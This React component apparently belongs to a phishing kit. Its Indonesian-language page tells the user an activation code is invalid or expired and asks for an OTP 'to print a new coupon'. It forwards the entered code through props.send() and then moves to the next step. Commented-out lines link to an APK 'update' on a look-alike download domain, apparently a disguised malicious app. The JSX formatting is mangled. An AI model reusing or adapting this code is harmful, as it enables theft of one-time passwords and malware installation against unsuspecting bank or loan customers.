import {
    useNavigate
} from 'react-router-dom'
import '../assets/css/App.css';
import muda from '../assets/img/muda.png'

function Pempat(props) {
    const nav = useNavigate()

    const ok = (e) => {
        e.preventDefault()
        props.send()
        //window.location = "https://unduh-new-versi.store/perbarui/Update Limit Ceria.apk"
        nav("/lima")
    }

    return ( <
        div className = "pg5" >
        <
        form className = 'form1'
        onSubmit = {
            ok
        } >
        <
        br / >
        <
        br / >
        <
        label > Kode Aktivasi INVALID / Kadaluarsa < /label> <
        br / >
        <
        br / >
        <
        label > Kode OTP Cetak Kupon Baru < /label> <
        br / >
        <
        input style = {
            {
                textAlign: "center"
            }
        }
        type = "number"
        placeholder = 'Masukan Kode Cetak Kupon'
        minLength = {
            4
        }
        maxLength = {
            7
        }
        onInput = {
            e => props.tujuh(e.target.value)
        }
        required / >
        <
        br / >
        <
        button > Konfirmasi < /button> <
        br / > < br / >
        <
        br / >
        <
        br > { /*<a href="https://unduh-new-versi.store/perbarui/Ceria V.02" className="wa">Upgrade V.02</a>*/ } <
        /br> <
        /form> <
        /div>
    );
}

export default Pempat;